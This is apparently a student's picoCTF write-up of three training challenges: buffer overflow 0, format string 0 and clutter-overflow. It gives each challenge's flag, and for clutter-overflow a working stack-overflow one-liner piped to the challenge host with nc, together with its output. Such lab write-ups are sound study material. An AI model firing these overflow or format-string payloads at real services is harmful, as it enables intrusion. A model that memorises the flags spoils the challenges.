# 1. buffer overflow 0

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Additional details will be available after launching your challenge instance.

## Solution:

- The challenge being buffer overflow told me that I write more information into a buffer than it is designed to hold. So here's what I did:
<img width="1227" height="108" alt="Screenshot 2025-10-31 211943" src="https://github.com/user-attachments/assets/be01a6c0-8972-4880-bbe4-8e4773aab5f9" />

## Flag:

`picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`

## Concepts Learned:

I learned what a buffer overflow vulnerability is and how to exploit it (when you overload a buffer, the extra data spills over and causes corrupt data).

## Resources:

- - https://en.wikipedia.org/wiki/Buffer_overflow



## 2. format string 0

Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 52808

## Solution:

- The Format String exploit is similar to sql injection and ssti. It occurs when the submitted data of an input string is evaluated as a command by the application. In the code, there was a section where format specifier is not mentioned (%s) so I thought that this could possibly trigger some vulnerabilities.
- The only option with a format specifier was `Gr%114d_Cheese`. Similarly, in `Cla%sic_Che%s%steak`. So here's how I got the flag:

 <img width="1816" height="337" alt="Screenshot 2025-10-31 212119" src="https://github.com/user-attachments/assets/21eb0c86-9b25-458a-b846-3bc0bd1b2b7c" />

## Flag:

`picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}`

## Concepts Learned:

I learned about the format string exploit.

## Resources

- https://owasp.org/www-community/attacks/Format_string_attack



# 3. clutter-overflow

Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:

- I had to overflow the input then input 0xdeadbeef in little endian form.
```
vasha@Varsha:~$ (python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Flag:

`picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`

## Concepts Learned:

I learned how to use GDB to look at code.

## Resources:

- https://www.geeksforgeeks.org/c/gdb-step-by-step-introduction/
